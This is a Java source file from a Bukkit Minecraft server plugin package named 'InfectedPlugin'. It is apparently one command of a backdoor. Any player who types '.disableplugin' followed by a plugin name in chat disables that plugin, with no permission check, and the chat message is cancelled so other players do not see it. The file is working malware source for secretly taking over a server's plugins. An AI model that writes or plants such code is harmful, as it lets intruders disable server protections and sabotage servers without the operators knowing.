package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

public class Command_disableplugin implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".disableplugin"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .disableplugin <plugin>");
                    event.setCancelled(true);
                    return;
                }
                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
                if (plugin != null)
                {
                    p.sendMessage(ChatColor.RED + "Plugin " + args[1] + " disabled!");
                    Bukkit.getPluginManager().disablePlugin(plugin);
                }
                else
                {
                    p.sendMessage("Plugin not found!");
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
